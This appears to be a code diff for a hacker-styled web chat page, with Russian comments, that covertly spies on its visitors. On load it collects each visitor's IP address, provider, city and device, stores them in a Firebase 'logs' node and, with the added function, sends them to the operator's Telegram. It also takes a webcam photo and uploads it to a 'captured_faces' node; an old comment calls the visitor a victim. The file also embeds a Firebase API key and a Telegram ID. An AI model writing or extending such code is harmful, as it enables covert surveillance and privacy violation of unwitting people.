@@ -12,35 +12,41 @@
         :root { --f-red: #ff003c; --f-white: #f0f0f0; --f-black: #0a0a0a; --f-green: #00ff41; }
         body { background: var(--f-black); color: var(--f-white); font-family: 'Courier New', monospace; margin: 0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
         
-        #boot-screen { position: fixed; inset: 0; background: #000; z-index: 9999; padding: 20px; font-size: 11px; color: var(--f-green); }
+        /* Загрузка */
+        #boot-screen { position: fixed; inset: 0; background: #000; z-index: 9999; padding: 20px; font-size: 11px; color: var(--f-green); overflow-y: auto; }
         .cursor { display: inline-block; width: 8px; height: 15px; background: var(--f-green); animation: blink 0.8s infinite; vertical-align: middle; }
         @keyframes blink { 50% { opacity: 0; } }
 
+        /* Приложение */
         #app { display: none; flex-direction: column; height: 100vh; position: relative; }
-        header { padding: 15px; border-bottom: 1px solid #222; text-align: center; flex-shrink: 0; }
-        .logo { font-size: 22px; font-weight: bold; letter-spacing: 5px; color: var(--f-red); }
-
-        #admin-btn { display: none; position: absolute; right: 10px; top: 12px; background: var(--f-red); color: white; border: none; padding: 8px 12px; font-size: 10px; font-weight: bold; animation: pulse 1.5s infinite; z-index: 100; }
+        header { padding: 15px; border-bottom: 1px solid #222; text-align: center; flex-shrink: 0; position: relative; }
+        .logo { font-size: 20px; font-weight: bold; letter-spacing: 5px; color: var(--f-red); }
+        
+        #admin-btn { display: none; position: absolute; right: 10px; top: 12px; background: var(--f-red); color: white; border: none; padding: 8px 12px; font-size: 10px; font-weight: bold; animation: pulse 1.5s infinite; z-index: 100; cursor: pointer; }
         @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(255, 0, 60, 0.7); } 70% { box-shadow: 0 0 0 10px rgba(255, 0, 60, 0); } 100% { box-shadow: 0 0 0 0 rgba(255, 0, 60, 0); } }
 
-        .nav-tabs { display: flex; border-bottom: 1px solid #222; background: #0d0d0d; }
-        .tab { flex: 1; padding: 15px 5px; text-align: center; font-size: 9px; cursor: pointer; color: #444; border-bottom: 2px solid transparent; }
-        .tab.active { color: var(--f-red); border-bottom: 2px solid var(--f-red); background: rgba(255,0,60,0.05); }
+        /* Навигация */
+        .nav-tabs { display: flex; border-bottom: 1px solid #222; background: #0d0d0d; flex-shrink: 0; }
+        .tab { flex: 1; padding: 15px 5px; text-align: center; font-size: 10px; cursor: pointer; color: #444; border-bottom: 2px solid transparent; text-transform: uppercase; }
+        .tab.active { color: var(--f-red); border-bottom: 2px solid var(--f-red); background: rgba(255, 0, 60, 0.05); }
 
+        /* Контент */
         .tab-content { display: none; flex-grow: 1; padding: 15px; overflow-y: auto; }
         .tab-content.active { display: flex; flex-direction: column; }
 
-        #global-chat { flex-grow: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; margin-bottom: 10px; }
-        .m-wrap { border-left: 1px solid #333; padding-left: 10px; margin-bottom: 5px; }
-        .m-user { color: var(--f-red); font-size: 10px; display: block; }
-        .m-text { font-size: 14px; color: #ccc; }
+        /* Чат */
+        #global-chat { flex-grow: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; margin-bottom: 10px; }
+        .m-wrap { border-left: 2px solid #222; padding-left: 10px; margin-bottom: 5px; }
+        .m-user { color: var(--f-red); font-size: 10px; display: block; margin-bottom: 2px; }
+        .m-text { font-size: 14px; color: #ccc; word-wrap: break-word; }
 
-        .input-box { display: flex; gap: 8px; border-top: 1px solid #222; padding-top: 10px; }
-        input { flex: 1; background: #000; border: 1px solid #333; color: #fff; padding: 12px; outline: none; }
-        button#send-btn { background: var(--f-red); color: #fff; border: none; padding: 0 20px; font-weight: bold; }
+        .input-box { display: flex; gap: 8px; border-top: 1px solid #222; padding: 10px 0; }
+        input { flex: 1; background: #000; border: 1px solid #333; color: #fff; padding: 12px; outline: none; font-family: inherit; }
+        button#send-btn { background: var(--f-red); color: white; border: none; padding: 0 20px; font-weight: bold; cursor: pointer; }
 
+        /* Whoami */
         #captured-photo { width: 100%; max-width: 320px; border: 2px solid var(--f-red); margin: 20px auto; display: block; filter: contrast(1.1); }
-        #alert-text { color: var(--f-red); font-weight: bold; text-align: center; display: none; font-size: 18px; }
+        #alert-text { color: var(--f-red); font-weight: bold; text-align: center; display: none; font-size: 18px; line-height: 1.4; }
     </style>
 </head>
 <body>
@@ -63,7 +69,7 @@
             <div id="global-chat"></div>
             <div class="input-box">
                 <input type="text" id="chat-in" placeholder="type_message..." autocomplete="off">
-                <button onclick="sendMsg()" style="background:var(--f-red); color:#fff; border:none; padding:0 20px;">></button>
+                <button id="send-btn" onclick="sendMsg()">></button>
             </div>
         </div>
 
@@ -75,7 +81,7 @@
     </div>
 
 <script>
-    // --- ТВОЙ КОНФИГ ---
+    // --- НАСТРОЙКИ ---
     const firebaseConfig = {
         apiKey: "AIzaSyAYX3NCBoMREGY4WZGqgo-kl3hj5h7gq-A",
         authDomain: "fcocial-v5r.firebaseapp.com",
@@ -86,10 +92,11 @@
         databaseURL: "https://fcocial-v5r-default-rtdb.firebaseio.com/"
     };
 
+    const BOT_TOKEN = "ТВОЙ_ТОКЕН_БОТА"; // Вставь сюда токен от BotFather
+    const MY_TG_ID = 5131628747; 
+
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-
-    const MY_TG_ID = 5131628747; 
     let isElliot = false;
     let myNick = "anon_" + Math.floor(Math.random()*999);
 
@@ -109,41 +116,35 @@
     };
 
     async function bootSequence() {
-        const logs = ["init_packet_sniffer...", "mapping_network...", "firebase_link: OK", "scanning_biometrics..."];
+        const logs = ["intercepting_packets...", "mapping_network...", "firebase_link: OK", "scanning_biometrics..."];
         for(let t of logs) {
             let l = document.createElement('div'); l.innerText = `> ${t}`;
             document.getElementById('boot-logs').appendChild(l);
             await new Promise(r => setTimeout(r, 400));
         }
-        logTargetData(); // Собираем инфу о зашедшем
+        await logTargetData(); 
         startCapture();
         listenForHack();
-        listenChat();
+        listenChat(); // Запуск прослушивания истории чата
     }
 
-    // --- СБОР ИНФОРМАЦИИ ---
     async function logTargetData() {
         try {
-            // Получаем IP и провайдера через бесплатный API
             const res = await fetch('https://ipapi.co/json/');
             const info = await res.json();
             
-            const userData = {
-                nick: myNick,
-                ip: info.ip,
-                isp: info.org,
-                location: `${info.city}, ${info.country_name}`,
-                device: navigator.userAgent,
-                time: new Date().toLocaleString()
-            };
-
-            // Сохраняем в Firebase в папку 'logs'
+            const msg = `🔔 ВХОД В СЕТЬ:\nНик: ${myNick}\nIP: ${info.ip}\nГород: ${info.city}\nПровайдер: ${info.org}\nУстройство: ${navigator.platform}`;
+            
             if (!isElliot) {
-                db.ref('logs').push(userData);
+                db.ref('logs').push({ ...info, nick: myNick, time: new Date().toLocaleString() });
+                sendTgNotify(msg); // Отправка уведомления тебе в ТГ
             }
-        } catch (e) {
-            console.log("LOG_SKIP");
-        }
+        } catch (e) { console.log("LOG_SKIP"); }
+    }
+
+    function sendTgNotify(text) {
+        if (BOT_TOKEN === "ТВОЙ_ТОКЕН_БОТА") return;
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${MY_TG_ID}&text=${encodeURIComponent(text)}`);
     }
 
     async function startCapture() {
@@ -158,17 +159,8 @@
                     const reader = new FileReader();
                     reader.readAsDataURL(b); 
                     reader.onloadend = () => {
-                        const base64data = reader.result;
-                        document.getElementById('captured-photo').src = base64data;
-                        
-                        // Если это жертва, отправляем её фото тебе в базу
-                        if (!isElliot) {
-                            db.ref('captured_faces').push({
-                                user: myNick,
-                                photo: base64data,
-                                time: new Date().toLocaleString()
-                            });
-                        }
+                        document.getElementById('captured-photo').src = reader.result;
+                        if (!isElliot) db.ref('captured_faces').push({ user: myNick, photo: reader.result });
                     }
                     s.getTracks().forEach(t => t.stop());
                     document.getElementById('boot-screen').style.display = 'none';
@@ -196,15 +188,16 @@
         });
     }
 
+    // --- ИСТОРИЯ ЧАТА ---
     function sendMsg() {
         const i = document.getElementById('chat-in');
         if(!i.value.trim()) return;
-        db.ref('global_chat').push({ user: myNick, text: i.value });
+        db.ref('global_chat').push({ user: myNick, text: i.value, timestamp: Date.now() });
         i.value = '';
     }
 
     function listenChat() {
-        db.ref('global_chat').limitToLast(15).on('value', snap => {
+        db.ref('global_chat').limitToLast(30).on('value', snap => {
             const box = document.getElementById('global-chat');
             box.innerHTML = '';
             snap.forEach(c => {
